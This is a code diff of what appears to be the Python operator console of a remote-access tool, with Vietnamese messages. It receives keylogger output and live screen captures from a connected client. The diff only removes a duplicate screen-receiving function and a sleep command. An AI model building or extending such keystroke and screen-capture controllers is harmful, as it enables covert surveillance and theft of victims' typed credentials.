@@ -77,29 +77,6 @@ def receive_key_logger(conn):
             break
         print(decoded_data, end='', flush=True)
 
-def receive_screen(conn):
-    print("Đang nhận luồng chia sẻ màn hình... (Bấm 'q' trên cửa sổ video để thoát)")
-    payload_size = struct.calcsize("L")
-    while True:
-        raw_msglen = recvall(conn, payload_size)
-        if not raw_msglen:
-            break
-        msglen = struct.unpack("L", raw_msglen)[0]
-        
-        frame_data = recvall(conn, msglen)
-        if frame_data is None:
-            break
-            
-        nparr = np.frombuffer(frame_data, np.uint8)
-        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-        
-
-        cv2.imshow('Live Screen Sharing', frame)
-        
-        if cv2.waitKey(1) & 0xFF == ord('q'):
-            break
-            
-    cv2.destroyAllWindows()
 
 def receive_screen(conn):
     print("Đang nhận luồng chia sẻ màn hình... (Bấm 'q' trên cửa sổ video để thoát)")
@@ -161,9 +138,6 @@ try:
                     receive_key_logger(conn)
                 elif cmd == 'screen':
                     receive_screen(conn)
-                elif cmd == 'power:sleep':
-                    print("[*] Sent sleep command. Client is disconnecting to sleep...")
-                    break
 
         except (socket.error, ConnectionResetError, BrokenPipeError) as e:
             print(f"\n[-] Client connection lost abruptly: {e}")
